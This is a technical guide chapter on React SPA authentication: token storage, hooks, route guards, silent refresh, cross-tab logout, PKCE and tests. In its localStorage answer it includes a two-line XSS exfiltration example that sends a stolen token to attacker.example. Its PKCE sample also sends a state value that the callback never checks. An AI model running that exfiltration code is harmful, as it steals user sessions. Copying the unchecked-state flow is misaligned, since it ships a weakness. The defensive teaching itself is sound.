---
title: "React client authentication"
sidebar_label: "10.8 React client authentication"
description: "Token storage, useAuth hook, route guards, fetch interceptors with silent refresh, cross-tab logout, and pure-client OIDC for React SPAs."
sidebar_position: 8
---

This chapter is the React-side companion to the rest of [Part 10 (Authentication & Authorization)](./index.md). The earlier chapters explain the protocols and the server-side primitives. Here we cover the patterns that live entirely in the browser: where the access token is held, how a `useAuth` hook is shaped, how route guards work in modern React routers, how a `fetch` wrapper performs silent refresh without storming the refresh endpoint, how to keep multiple tabs in agreement about login state, and how to run an OpenID Connect (OIDC) flow with Proof Key for Code Exchange (PKCE) when no Backend-for-Frontend (BFF) is available.

The recommended deployment topology is still **Single-Page Application (SPA) in the browser, BFF on the server, `HttpOnly` session cookie between them**, exactly as in [Part 10 chapter 7](./07-implementations.md). The patterns in this chapter are the React-side glue that makes that topology pleasant to work with — and the fall-back patterns for when a BFF is not available and the SPA must hold tokens itself.

> **Acronyms used in this chapter.** API: Application Programming Interface. BFF: Backend-for-Frontend. CSRF: Cross-Site Request Forgery. IdP: Identity Provider. JSON: JavaScript Object Notation. JWT: JSON Web Token. MSW: Mock Service Worker. OIDC: OpenID Connect. PKCE: Proof Key for Code Exchange. RTL: React Testing Library. SPA: Single-Page Application. SSR: Server-Side Rendering. UI: User Interface. XSS: Cross-Site Scripting.

## 1. Where the access token lives

The decision is binding: it shapes every other pattern in this chapter, and it is the question senior interviewers open with.

| Storage | Survives refresh | XSS-readable | CSRF-vulnerable | Comment |
| --- | --- | --- | --- | --- |
| `HttpOnly` cookie set by a BFF | Yes | No | Mitigate with `SameSite=Lax/Strict` + double-submit token | The default. The browser never sees the token in JavaScript. |
| In-memory variable (no cookie) | No (lost on reload) | No | No (no automatic sending) | Acceptable when paired with a refresh-token cookie that *can* refresh on reload. |
| `localStorage` / `sessionStorage` | Yes | **Yes** | No | Rejected. Any successful XSS exfiltrates every active session. |
| `IndexedDB` | Yes | **Yes** | No | Same problem as `localStorage`; the storage API does not change the threat model. |

The rule is simple: **a long-lived bearer token must never be readable from JavaScript on a page that renders untrusted content**. "Untrusted content" includes any user-generated text, any third-party script (analytics, advertisement, chat widget), and any future feature you have not yet written. Practically that means every real production app.

The two acceptable shapes are therefore:

- **Cookie-bound session.** A BFF receives the OIDC tokens and writes an `HttpOnly`, `Secure`, `SameSite=Lax` cookie. The SPA calls the BFF; the BFF attaches the bearer token when calling downstream services. The browser stores nothing in JavaScript.
- **In-memory access token + cookie-bound refresh token.** When a BFF is impossible (a static SPA on a Content Delivery Network with no server in front of it), the access token lives in a module-scoped variable and dies on every reload. A long-lived, `HttpOnly` refresh cookie issued by the IdP is used to mint a new access token after reload. This still keeps the high-value secret out of JavaScript.

```ts
// auth/token.ts — module-scoped access-token holder
let accessToken: string | null = null;
let expiresAt = 0;

export function getAccessToken(): string | null {
  if (!accessToken || Date.now() > expiresAt - 30_000) return null;
  return accessToken;
}

export function setAccessToken(token: string, expiresInSeconds: number) {
  accessToken = token;
  expiresAt = Date.now() + expiresInSeconds * 1000;
}

export function clearAccessToken() {
  accessToken = null;
  expiresAt = 0;
}
```

The 30-second buffer in `getAccessToken` is the single most important detail: it ensures a token that will expire mid-flight is treated as already expired, which makes the silent refresh deterministic.

## 2. The `AuthProvider` and `useAuth` hook

The hook surface stays small. Senior interviewers will ask why each method exists; keep the answer short.

```tsx
// auth/AuthContext.tsx
import { createContext, useCallback, useContext, useEffect, useMemo, useState } from "react";
import { clearAccessToken, setAccessToken } from "./token";
import { fetchSession, performLogin, performLogout, performRefresh } from "./api";

export type User = { id: string; email: string; roles: string[] };

type AuthState =
  | { status: "loading" }
  | { status: "authenticated"; user: User }
  | { status: "anonymous" };

type AuthContextValue = AuthState & {
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  refresh: () => Promise<void>;
};

const AuthContext = createContext<AuthContextValue | null>(null);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [state, setState] = useState<AuthState>({ status: "loading" });

  const refresh = useCallback(async () => {
    try {
      const { user, accessToken, expiresIn } = await performRefresh();
      setAccessToken(accessToken, expiresIn);
      setState({ status: "authenticated", user });
    } catch {
      clearAccessToken();
      setState({ status: "anonymous" });
    }
  }, []);

  const login = useCallback(async (email: string, password: string) => {
    const { user, accessToken, expiresIn } = await performLogin(email, password);
    setAccessToken(accessToken, expiresIn);
    setState({ status: "authenticated", user });
  }, []);

  const logout = useCallback(async () => {
    await performLogout();
    clearAccessToken();
    setState({ status: "anonymous" });
  }, []);

  useEffect(() => {
    fetchSession().then(refresh, () => setState({ status: "anonymous" }));
  }, [refresh]);

  const value = useMemo(() => ({ ...state, login, logout, refresh }), [state, login, logout, refresh]);
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export function useAuth() {
  const value = useContext(AuthContext);
  if (!value) throw new Error("useAuth must be called inside <AuthProvider>");
  return value;
}
```

A few decisions worth defending in an interview:

- The state is a discriminated union with three explicit cases. Components render a skeleton during `loading`, a sign-in form during `anonymous`, and the application during `authenticated`. There is no fourth case to forget.
- `refresh` is the recovery path used by every other action. `login`, `logout`, and the silent-refresh timer all call it. Centralising the state transition prevents partial updates where the token is fresh but `state.user` is stale.
- The provider does no React rendering until the initial `fetchSession()` either resolves or rejects. This avoids the pattern where a protected route renders and then immediately redirects to `/login`, producing a visible flash.

### 2.1 SSR-safe initialization

If the React tree is rendered on the server (Next.js App Router, Remix, TanStack Start), the provider must not assume `window` exists. Wrap browser-only effects in a `useEffect`, which never runs on the server, and pass the initial session as a prop from the SSR loader so the first paint is correct:

```tsx
export function AuthProvider({
  initialSession,
  children,
}: {
  initialSession?: { user: User; accessToken: string; expiresIn: number };
  children: React.ReactNode;
}) {
  const [state, setState] = useState<AuthState>(
    initialSession
      ? { status: "authenticated", user: initialSession.user }
      : { status: "loading" }
  );

  useEffect(() => {
    if (initialSession) {
      setAccessToken(initialSession.accessToken, initialSession.expiresIn);
      return;
    }
    fetchSession().then(/* as above */);
  }, [initialSession]);
  // …rest of provider unchanged.
}
```

The server hands the SPA a hydrated session; the SPA never makes a `loading` round-trip on the very first render.

## 3. Route guards

### 3.1 React Router v7

```tsx
// auth/ProtectedRoute.tsx
import { Navigate, useLocation } from "react-router";
import { useAuth } from "./AuthContext";

export function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const auth = useAuth();
  const location = useLocation();

  if (auth.status === "loading") return <FullPageSpinner />;
  if (auth.status === "anonymous") {
    return <Navigate to="/login" replace state={{ from: location.pathname }} />;
  }
  return <>{children}</>;
}
```

```tsx
// router.tsx
import { createBrowserRouter, RouterProvider } from "react-router";
import { ProtectedRoute } from "./auth/ProtectedRoute";

const router = createBrowserRouter([
  { path: "/login", element: <Login /> },
  {
    path: "/",
    element: (
      <ProtectedRoute>
        <AppShell />
      </ProtectedRoute>
    ),
    children: [
      { path: "tasks", element: <Tasks /> },
      { path: "settings", element: <Settings /> },
    ],
  },
]);

export const App = () => <RouterProvider router={router} />;
```

The `replace` on the redirect is deliberate: the back button must not return the user to a protected route they can no longer reach.

### 3.2 TanStack Router

TanStack Router supports authentication as a first-class route concept via the `beforeLoad` hook, so the redirect happens before any data loader runs:

```ts
// routes/_app.tsx
import { createFileRoute, redirect } from "@tanstack/react-router";

export const Route = createFileRoute("/_app")({
  beforeLoad: ({ context, location }) => {
    if (context.auth.status !== "authenticated") {
      throw redirect({ to: "/login", search: { from: location.pathname } });
    }
  },
});
```

`context.auth` is provided by the router context, which the `AuthProvider` populates. Throwing a `redirect` is the idiomatic way to short-circuit a route in TanStack Router.

## 4. The `fetch` wrapper

The wrapper is the most code-heavy part of the chapter and the one interviewers like to dig into. Three behaviours must be correct simultaneously:

1. **Attach the access token** to every authenticated request.
2. **Detect a `401` response, refresh once, and retry** the original request transparently.
3. **Coalesce concurrent refreshes** so that a burst of ten parallel calls produces exactly one refresh round-trip rather than ten.

The third requirement is the one that is most often missed. The "single-flight" pattern is a single in-flight `Promise` that all callers `await`; once it settles, every queued caller picks up the new token together.

```ts
// auth/apiClient.ts
import { clearAccessToken, getAccessToken, setAccessToken } from "./token";

let refreshInFlight: Promise<void> | null = null;

async function refreshOnce() {
  if (!refreshInFlight) {
    refreshInFlight = (async () => {
      const r = await fetch("/auth/refresh", { method: "POST", credentials: "include" });
      if (!r.ok) throw new Error("refresh-failed");
      const body = (await r.json()) as { accessToken: string; expiresIn: number };
      setAccessToken(body.accessToken, body.expiresIn);
    })().finally(() => {
      refreshInFlight = null;
    });
  }
  return refreshInFlight;
}

export async function apiFetch(input: string, init: RequestInit = {}): Promise<Response> {
  const send = async () => {
    const token = getAccessToken();
    const headers = new Headers(init.headers);
    if (token) headers.set("Authorization", `Bearer ${token}`);
    return fetch(input, { ...init, headers, credentials: "include" });
  };

  let response = await send();
  if (response.status !== 401) return response;

  try {
    await refreshOnce();
  } catch {
    clearAccessToken();
    window.dispatchEvent(new CustomEvent("auth:logout"));
    return response;
  }

  return send();
}
```

Three details earn senior credit in an interview:

- **One retry only.** If the second response is also a `401` the user is genuinely unauthenticated and the wrapper returns the failure rather than entering an infinite loop.
- **No retry on non-`GET` requests when the body is a stream.** The example above retries every method because `init.body` is a serializable value; if `init.body` is a `ReadableStream` (file upload), the second call must clone the stream first or the retry will silently send an empty body. Add `if (init.body instanceof ReadableStream) throw …` to surface the misuse.
- **`credentials: "include"`.** The refresh cookie travels with the refresh request and only with the refresh request. Forgetting this is the most common cause of "the refresh always 401s in production but works locally".

### 4.1 Wiring into TanStack Query

```ts
// queryClient.ts
import { QueryClient } from "@tanstack/react-query";
import { apiFetch } from "./auth/apiClient";

export const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      queryFn: async ({ queryKey }) => {
        const [path] = queryKey as [string];
        const r = await apiFetch(path);
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      },
      retry: (failureCount, error) => {
        const message = (error as Error).message;
        if (message.includes("HTTP 401") || message.includes("HTTP 403")) return false;
        return failureCount < 2;
      },
    },
  },
});
```

The retry policy disables retries on auth failures because the wrapper has already done its single refresh attempt. Letting TanStack Query retry would mask the failure and waste round-trips.

## 5. Optimistic updates with rollback on `401` / `403`

Optimistic UI for protected actions is straightforward provided the rollback path is wired to the auth failure:

```tsx
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiFetch } from "../auth/apiClient";
import type { Task } from "./types";

export function useToggleTask() {
  const qc = useQueryClient();
  return useMutation({
    mutationFn: async (task: Task) => {
      const r = await apiFetch(`/tasks/${task.id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ done: !task.done }),
      });
      if (r.status === 401 || r.status === 403) throw new Error("auth");
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return (await r.json()) as Task;
    },
    onMutate: async (task) => {
      await qc.cancelQueries({ queryKey: ["/tasks"] });
      const previous = qc.getQueryData<Task[]>(["/tasks"]);
      qc.setQueryData<Task[]>(["/tasks"], (current) =>
        (current ?? []).map((t) => (t.id === task.id ? { ...t, done: !t.done } : t))
      );
      return { previous };
    },
    onError: (_err, _task, ctx) => {
      if (ctx?.previous) qc.setQueryData(["/tasks"], ctx.previous);
    },
    onSettled: () => qc.invalidateQueries({ queryKey: ["/tasks"] }),
  });
}
```

The `onError` rollback fires whether the failure was a network error, a server `500`, or the `Error("auth")` thrown when the refresh path could not save the request. This is the correct behaviour: if the user lost their session, they need to see the original UI state, then a sign-in prompt — not a half-applied write.

## 6. Cross-tab session synchronization

A user who logs out in one tab expects every other tab to log out as well. The standard primitive is the `BroadcastChannel` API: a same-origin pub/sub channel that delivers messages to other tabs and workers but not to the publishing tab.

```ts
// auth/broadcast.ts
const channel = typeof BroadcastChannel !== "undefined"
  ? new BroadcastChannel("auth")
  : null;

type AuthEvent = { type: "logout" } | { type: "login"; userId: string };

export function publishAuth(event: AuthEvent) {
  channel?.postMessage(event);
}

export function subscribeAuth(handler: (event: AuthEvent) => void) {
  if (!channel) return () => {};
  const listener = (e: MessageEvent<AuthEvent>) => handler(e.data);
  channel.addEventListener("message", listener);
  return () => channel.removeEventListener("message", listener);
}
```

```tsx
// AuthProvider — additions
useEffect(() => {
  const unsubscribe = subscribeAuth((event) => {
    if (event.type === "logout") {
      clearAccessToken();
      setState({ status: "anonymous" });
    }
    if (event.type === "login") {
      refresh();
    }
  });
  return unsubscribe;
}, [refresh]);
```

Combine with a Page Visibility listener so a tab that wakes up after a long sleep refreshes its session before showing stale data:

```ts
useEffect(() => {
  const onVisible = () => {
    if (document.visibilityState === "visible") refresh();
  };
  document.addEventListener("visibilitychange", onVisible);
  return () => document.removeEventListener("visibilitychange", onVisible);
}, [refresh]);
```

Browsers older than 2022 without `BroadcastChannel` (notable for embedded WebViews) can fall back to a `storage` event on a sentinel key: writing `localStorage.setItem("auth-event", JSON.stringify(event))` from one tab fires a `storage` event in every other same-origin tab. The fall-back has worse semantics (no message ordering, requires a marker write that mutates `localStorage`) but is the only option when `BroadcastChannel` is unavailable.

## 7. Pure-client OIDC with PKCE

When no BFF is available, the SPA performs the full OIDC Authorization Code flow with PKCE itself. The flow is exactly the one described in [Part 10 chapter 3](./03-oauth-oidc.md); the React-side moving parts are the verifier/challenge generation, the redirect to the IdP, and the token exchange in the callback route.

```ts
// auth/pkce.ts
function base64url(bytes: ArrayBuffer): string {
  return btoa(String.fromCharCode(...new Uint8Array(bytes)))
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

export async function createPkcePair() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)).buffer);
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
  const challenge = base64url(digest);
  return { verifier, challenge };
}

export function startAuthorizationRedirect(opts: {
  authorizationEndpoint: string;
  clientId: string;
  redirectUri: string;
  scope: string;
  verifier: string;
  challenge: string;
}) {
  sessionStorage.setItem("pkce.verifier", opts.verifier);
  const url = new URL(opts.authorizationEndpoint);
  url.searchParams.set("response_type", "code");
  url.searchParams.set("client_id", opts.clientId);
  url.searchParams.set("redirect_uri", opts.redirectUri);
  url.searchParams.set("scope", opts.scope);
  url.searchParams.set("code_challenge", opts.challenge);
  url.searchParams.set("code_challenge_method", "S256");
  url.searchParams.set("state", crypto.randomUUID());
  window.location.assign(url.toString());
}
```

```tsx
// routes/Callback.tsx
import { useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router";
import { setAccessToken } from "../auth/token";

const TOKEN_ENDPOINT = "https://idp.example.com/oauth2/token";
const CLIENT_ID = "spa-client";
const REDIRECT_URI = `${window.location.origin}/callback`;

export function Callback() {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  useEffect(() => {
    const code = params.get("code");
    const verifier = sessionStorage.getItem("pkce.verifier");
    if (!code || !verifier) {
      navigate("/login", { replace: true });
      return;
    }

    fetch(TOKEN_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        client_id: CLIENT_ID,
        code,
        redirect_uri: REDIRECT_URI,
        code_verifier: verifier,
      }),
    })
      .then((r) => (r.ok ? r.json() : Promise.reject(r.status)))
      .then(({ access_token, expires_in }) => {
        setAccessToken(access_token, expires_in);
        sessionStorage.removeItem("pkce.verifier");
        navigate("/", { replace: true });
      })
      .catch(() => navigate("/login", { replace: true }));
  }, [params, navigate]);

  return <p>Signing you in…</p>;
}
```

Two notes:

- The verifier lives in `sessionStorage` rather than `localStorage` so that closing the tab discards it. PKCE only needs it for the few seconds between the redirect and the callback.
- Storing the resulting `access_token` in `sessionStorage` would re-introduce the XSS exposure described in section 1. The token holder in `auth/token.ts` is the only acceptable home; a refresh on reload re-acquires it.

## 8. Testing

The authentication code is the part most worth testing because the failure modes are silent. Two layers cover it well: MSW for network-level interception, and React Testing Library for the guard and provider behaviour.

```ts
// test/handlers.ts
import { http, HttpResponse } from "msw";

export const handlers = [
  http.post("/auth/login", async ({ request }) => {
    const body = (await request.json()) as { email: string; password: string };
    if (body.password !== "correct-horse") return HttpResponse.json({ error: "bad" }, { status: 401 });
    return HttpResponse.json({
      user: { id: "u1", email: body.email, roles: ["user"] },
      accessToken: "tok-1",
      expiresIn: 60,
    });
  }),
  http.post("/auth/refresh", () =>
    HttpResponse.json({ accessToken: "tok-2", expiresIn: 60 })
  ),
  http.post("/auth/logout", () => HttpResponse.json({ ok: true })),
];
```

```tsx
// AuthProvider.test.tsx
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { setupServer } from "msw/node";
import { AuthProvider, useAuth } from "../auth/AuthContext";
import { handlers } from "./handlers";

const server = setupServer(...handlers);
beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

function Probe() {
  const auth = useAuth();
  return <p>{auth.status}</p>;
}

test("redirects to anonymous on a failed initial session", async () => {
  render(
    <AuthProvider>
      <Probe />
    </AuthProvider>
  );
  await waitFor(() => expect(screen.getByText("anonymous")).toBeInTheDocument());
});
```

For the `apiFetch` wrapper, the highest-value test is the single-flight property: ten parallel `apiFetch` calls that all receive `401` should produce exactly one `POST /auth/refresh`. MSW's request log makes that assertion trivial. If the test passes, the wrapper is doing what the chapter promises; if it fails, the user will see a refresh storm in production.

## Key takeaways

- The default deployment is a BFF that holds tokens in an `HttpOnly` cookie. Everything else in this chapter applies even in that topology, because the SPA still needs to react to `401`, refresh once, coalesce concurrent refreshes, and synchronise across tabs.
- A `useAuth` hook with a discriminated `status` removes whole classes of "is the user logged in?" bugs by making "I do not know yet" an explicit state.
- Route guards live as close to the router as possible. React Router v7 uses a wrapper component; TanStack Router uses `beforeLoad` and `redirect`.
- The `fetch` wrapper must implement single-flight refresh, return the original `401` if refresh fails, and rely on `credentials: "include"` for the refresh cookie.
- `BroadcastChannel` is the standard primitive for cross-tab logout. Combine with a Page Visibility listener so woken tabs refresh before they paint stale data.
- Pure-client PKCE is a viable fallback when no BFF exists, but the access token must remain in memory so a successful XSS does not exfiltrate sessions across reloads.
- Tests go through MSW so the production wrapper code is exercised end to end; assert the single-flight property explicitly.

## Common interview questions

1. Why is `localStorage` not an acceptable home for an access token?
2. What is the single-flight refresh pattern and what fails without it?
3. How does the `useAuth` hook's discriminated `status` prevent rendering bugs?
4. How would you log out a user in every open tab in a same-origin SPA?
5. When would you choose pure-client PKCE over a BFF?

## Answers

### 1. Why is `localStorage` not an acceptable home for an access token?

`localStorage` is readable from any JavaScript executing on the same origin, which is the exact threat model that XSS exploits. A single successful XSS — a stored comment that smuggles a `<script>` past the sanitiser, a compromised third-party script, a misconfigured Content Security Policy — gives the attacker every active session token, with no further interaction required. Cookie-bound tokens marked `HttpOnly` are not reachable by any JavaScript code, so the same XSS leaks far less.

**How it works.** When the browser evaluates a script in the page's origin, it has full access to the `Storage` interface. There is no permission boundary inside the JavaScript environment. The token does not have to be exfiltrated as plaintext either: the attacker can call any authenticated API directly using `fetch`, attaching the token they just read, and the application's own backend will accept the calls because they are syntactically identical to legitimate ones.

```ts
const exfil = localStorage.getItem("access_token");
fetch("https://attacker.example/collect", { method: "POST", body: exfil });
```

**Trade-offs / when this fails.** Cookies are not free either: they require `SameSite=Lax` or `Strict` plus a CSRF defence (typically a double-submit token) to survive the analogous cross-site request attack. The right answer in 2026 is `HttpOnly` + `Secure` + `SameSite=Lax` cookies issued by a BFF. See [section 1](#1-where-the-access-token-lives) for the full storage matrix and [Part 10 chapter 4](./04-cookies.md) for the cookie-flag reasoning.

### 2. What is the single-flight refresh pattern and what fails without it?

Single-flight refresh ensures that a burst of authenticated requests that all receive `401` triggers exactly one refresh round-trip rather than one per failed request. Concretely it is a module-scoped `Promise` that callers `await`; the first caller starts the refresh, every subsequent caller observes the same `Promise` and waits for the same response.

**How it works.** Without it, ten parallel `fetch` calls returning `401` would each call `POST /auth/refresh` ten times. Even if the IdP tolerated the load, the refresh-token rotation policy on the server (chapter [`05-refresh-tokens.md`](./05-refresh-tokens.md)) would invalidate the refresh token after the first use and reject the next nine, logging the user out for no reason. Worse, the second-onwards request would reach the IdP with a token that no longer maps to a session and trigger the IdP's "stolen refresh token" alarm, leading to a forced sign-out across every device.

```ts
let refreshInFlight: Promise<void> | null = null;

function refreshOnce() {
  if (!refreshInFlight) {
    refreshInFlight = doRefresh().finally(() => {
      refreshInFlight = null;
    });
  }
  return refreshInFlight;
}
```

**Trade-offs / when this fails.** The pattern assumes one tab. Two tabs both hitting `401` will each run their own refresh because the in-flight `Promise` is per-document. This is normally fine — refresh-token rotation tolerates one rotation per concurrent caller — but in pathological cases the cross-tab coordination from [section 6](#6-cross-tab-session-synchronization) is needed. See [section 4](#4-the-fetch-wrapper) for the full implementation, including the "one retry only" guard.

### 3. How does the `useAuth` hook's discriminated `status` prevent rendering bugs?

The hook returns `{ status: "loading" } | { status: "authenticated"; user } | { status: "anonymous" }` rather than a `{ user: User | null }` object. The discriminator turns "I do not know yet" into an explicit state that components must handle, which prevents the most common React auth bug: a protected route that renders for one frame because the initial state was `null` (interpreted as "anonymous") before the actual session check resolved.

**How it works.** With `user: User | null`, every consumer must remember that `null` is ambiguous: it could mean "checked, signed out" or "still checking". The compiler does not help. With a discriminated union, TypeScript narrows the type inside each branch, so `auth.status === "authenticated" && auth.user.email` is type-safe and the compiler refuses to read `auth.user` in the other branches.

```tsx
function Header() {
  const auth = useAuth();
  if (auth.status === "loading") return <SkeletonHeader />;
  if (auth.status === "anonymous") return <SignInButton />;
  return <span>Hello, {auth.user.email}</span>;
}
```

**Trade-offs / when this fails.** The pattern adds one extra render compared with eager assumption that the user is anonymous. For applications where the unauthenticated experience is the majority case, this is an acceptable cost; for dashboards where users are almost always signed in, server-side rendering with the SSR-safe initialisation in [section 2.1](#21-ssr-safe-initialization) eliminates the loading flash entirely.

### 4. How would you log out a user in every open tab in a same-origin SPA?

The standard primitive is `BroadcastChannel`: a same-origin pub/sub channel that delivers messages to other tabs and workers but not to the publishing tab. The logout flow posts a `{ type: "logout" }` message, every subscribed tab clears its in-memory token and transitions its `useAuth` state to `anonymous`, and any next `apiFetch` call sees the anonymous state and redirects to `/login`.

**How it works.** Each tab opens the same channel name (`new BroadcastChannel("auth")`) when the `AuthProvider` mounts. The publisher does not receive its own message, so the originating tab still drives its own UI through the normal `logout()` code path. Subscribed tabs handle the message in the next microtask and the React state transition propagates as usual.

```ts
const channel = new BroadcastChannel("auth");
channel.postMessage({ type: "logout" });
channel.addEventListener("message", (e) => {
  if (e.data.type === "logout") clearSessionState();
});
```

**Trade-offs / when this fails.** Some embedded WebViews in older mobile applications do not implement `BroadcastChannel`. The fall-back is the `storage` event: writing a sentinel key to `localStorage` from one tab fires a `storage` event in every other same-origin tab. The fall-back is strictly worse — it requires a marker write that mutates `localStorage`, has weaker delivery guarantees, and does not work for cross-worker communication — but it is the only universal option. See [section 6](#6-cross-tab-session-synchronization) for both implementations.

### 5. When would you choose pure-client PKCE over a BFF?

A BFF is the default. Pure-client PKCE is a deliberate fallback for two situations: a static SPA hosted on a Content Delivery Network with no server in front of it (the cheapest possible deployment, sometimes mandated by the team's platform constraints), and a mobile-style web application that wants to redirect to a corporate IdP without a server hop. In both cases the IdP supports the OAuth 2.0 Authorization Code flow with PKCE, and the SPA can run the entire flow itself.

**How it works.** The SPA generates a high-entropy random verifier, hashes it to produce a challenge, redirects the user to the IdP's authorisation endpoint with the challenge, and stores the verifier in `sessionStorage`. The IdP authenticates the user and redirects back to a callback route with a short-lived authorisation code. The callback route exchanges the code plus the original verifier for an access token at the IdP's token endpoint. PKCE prevents an interception attack on the redirect URL because the attacker would need the verifier to complete the exchange.

```ts
const { verifier, challenge } = await createPkcePair();
sessionStorage.setItem("pkce.verifier", verifier);
window.location.assign(`${idp}/authorize?code_challenge=${challenge}&code_challenge_method=S256&...`);
```

**Trade-offs / when this fails.** The access token must live only in memory (see [section 1](#1-where-the-access-token-lives)) — storing it in `sessionStorage` would re-introduce XSS exposure across reloads. Refresh tokens are awkward without a BFF because the IdP cannot set an `HttpOnly` cookie for the SPA's origin, so the refresh token must either be omitted (forcing the user to re-authenticate after each reload) or held in memory (so that a reload signs the user out anyway). For any application with a server component, putting that server in the path as a BFF is the better design. See [Part 10 chapter 7](./07-implementations.md) for the BFF reference implementation.

## Further reading

- [OAuth 2.0 Security Best Current Practice (RFC 9700)](https://datatracker.ietf.org/doc/rfc9700/).
- [Auth0: SPA security best practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage).
- [TanStack Router authenticated routes](https://tanstack.com/router/latest/docs/framework/react/guide/authenticated-routes).
- [MSW: Mocking responses](https://mswjs.io/docs/network-behavior/rest).
